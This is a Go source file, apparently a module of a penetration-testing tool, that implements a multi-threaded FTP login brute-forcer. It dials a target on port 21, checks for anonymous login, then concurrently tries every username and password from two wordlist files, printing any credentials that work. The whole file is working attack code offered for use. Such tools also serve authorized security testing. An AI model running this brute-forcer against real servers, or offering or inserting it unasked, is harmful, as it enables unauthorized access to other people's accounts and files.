package ftp

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	anonymousUser = "anonymous"
	anonymousPass = "anonymous"
)

var total uint32
var completed uint32

// FTPConfig holds configuration for the FTP module
type FTPConfig struct {
	Target      string
	UserFile    string
	PassFile    string
	WorkerCount int
}

// FTPClient wraps the FTP connection and operations
type FTPClient struct {
	conn net.Conn
}

// NewFTPClient initializes a new FTP client
func NewFTPClient(target string) (*FTPClient, error) {
	conn, err := net.DialTimeout("tcp", target+":21", 5*time.Second)
	if err != nil {
		return nil, err
	}
	return &FTPClient{conn: conn}, nil
}

// CheckAnonymousLogin checks if anonymous login is allowed
func (ftp *FTPClient) CheckAnonymousLogin() bool {
	_, err := ftp.conn.Write([]byte("USER " + anonymousUser + "\r\n"))
	if err != nil {
		return false
	}
	buf := make([]byte, 1024)
	_, err = ftp.conn.Read(buf)

	if err != nil {
		return false
	}

	return strings.Contains(string(buf), "230")
}

// TryLogin attempts login with a given username and password
func (ftp *FTPClient) TryLogin(user, pass string) bool {
	_, err := ftp.conn.Write([]byte("USER " + user + "\r\n"))
	if err != nil {
		return false
	}
	buf := make([]byte, 1024)
	_, err = ftp.conn.Read(buf)

	if err != nil {
		return false
	}

	if !strings.Contains(string(buf), "331") {
		return false
	}

	_, err = ftp.conn.Write([]byte("PASS " + pass + "\r\n"))
	if err != nil {
		return false
	}
	_, err = ftp.conn.Read(buf)

	if err != nil {
		return false
	}

	return strings.Contains(string(buf), "230")
}

// Close closes the FTP connection
func (ftp *FTPClient) Close() {
	ftp.conn.Close()
}

// LoadUsers loads users from a file
func LoadUsers(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var users []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		users = append(users, strings.TrimSpace(scanner.Text()))
	}
	return users, scanner.Err()
}

// LoadPasswords loads passwords from a file
func LoadPasswords(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, strings.TrimSpace(scanner.Text()))
	}
	return passwords, scanner.Err()
}

func printProgress() {
	progress := getProgress()
	fmt.Printf("\033[2K\r[?] Progress: %.2f%%", progress)
}

func getProgress() float64 {
	if total == 0 {
		return 0.0
	}
	completedCount := atomic.LoadUint32(&completed)
	return (float64(completedCount) / float64(total)) * 100
}

// FTPBruteForcer performs multi-threaded brute force attack
func FTPBruteForcer_Init(target string, userFile string, passFile string, workerCount int) (bool, string, string) {
	users, err := LoadUsers(userFile)
	if err != nil {
		fmt.Println("[X] Error loading users:", err)
		return false, "", ""
	}

	passwords, err := LoadPasswords(passFile)
	if err != nil {
		fmt.Println("[X] Error loading passwords:", err)
		return false, "", ""
	}

	total = uint32(len(users) * len(passwords))
	fmt.Printf("[*] Total Usernames: %d\n", len(users))
	fmt.Printf("[*] Total Passwords: %d\n", len(passwords))
	fmt.Printf("[*] Total Combinations: %d\n", total)

	var wg sync.WaitGroup
	sem := make(chan struct{}, workerCount)

	// Start ticker to print progress every second
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	go func() {
		for range ticker.C {
			printProgress()
		}
	}()

	ftp, err := NewFTPClient(target)

	if err != nil {
		fmt.Println("[X] Error connecting to FTP server:", err)
		return false, "", ""
	}

	if ftp.CheckAnonymousLogin() {
		fmt.Println("[+] Anonymous login allowed!")
		return true, "anon", "anon"
	} else {
		fmt.Println("[X] Anonymous login not allowed!")
	}

	ftp.Close()

	var validCreds []string

	for _, user := range users {
		for _, pass := range passwords {
			sem <- struct{}{}
			wg.Add(1)

			go func(user, pass string) {
				defer wg.Done()
				defer func() { <-sem }()
				ftp, err := NewFTPClient(target)
				if err != nil {
					fmt.Println("[X] Error connecting to FTP server:", err)
					return
				}
				defer ftp.Close()

				if ftp.TryLogin(user, pass) {
					fmt.Printf("\n[+] Success! User: %s, Password: %s\n", user, pass)
					validCreds = append(validCreds, user)
					validCreds = append(validCreds, pass)
				}
			}(user, pass)
		}
	}

	wg.Wait()
	fmt.Println("\n[!] Brute force attack completed.")

	if len(validCreds) > 0 {
		return true, validCreds[0], validCreds[1]
	}

	return false, "", ""
}
